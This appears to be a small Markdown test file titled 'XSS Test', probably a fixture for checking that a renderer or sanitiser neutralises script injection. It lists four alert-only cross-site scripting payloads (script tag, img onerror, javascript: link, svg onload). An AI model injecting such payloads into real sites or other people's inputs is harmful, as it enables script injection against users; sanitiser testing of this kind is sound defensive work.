# XSS Test
<script>alert('XSS1')</script>
<img src=x onerror=alert('XSS2')>
[click me](javascript:alert('XSS3'))
<svg/onload=alert('XSS4')>
</script>
